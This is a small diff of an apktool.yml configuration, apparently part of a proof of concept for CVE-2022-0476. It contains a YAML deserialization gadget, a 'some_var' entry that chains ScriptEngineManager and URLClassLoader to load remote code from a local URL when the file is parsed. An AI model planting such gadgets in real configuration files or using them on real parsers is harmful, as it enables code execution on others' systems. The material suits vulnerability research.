@@ -3,14 +3,12 @@ apkFileName: cve20220476.apk
 some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://127.0.0.1:8000"]]]]
 doNotCompress:
 - arsc
-isFrameworkApk: false
 packageInfo:
   forcedPackageId: '127'
   renameManifestPackage: null
 sdkInfo:
   minSdkVersion: '25'
   targetSdkVersion: '30'
-sharedLibrary: false
 sparseResources: false
 usesFramework:
   ids:
